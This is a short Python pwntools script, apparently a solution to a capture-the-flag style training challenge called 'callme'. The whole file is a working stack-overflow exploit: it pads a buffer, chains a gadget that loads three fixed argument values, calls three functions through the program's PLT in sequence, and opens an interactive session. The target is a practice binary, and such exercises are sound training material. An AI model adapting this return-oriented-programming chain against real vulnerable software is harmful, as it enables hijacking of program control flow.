from pwn import *

p = ELF('./callme')
r = process('./callme')
call1 = p.plt['callme_one']
call2 = p.plt['callme_two']
call3 = p.plt['callme_three']
pop3 = p.symbols['usefulGadgets']
junk = b'X'*40
payload = junk
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call1)
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call2)
payload += p64(pop3)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(call3)
r.sendline(payload)
r.interactive()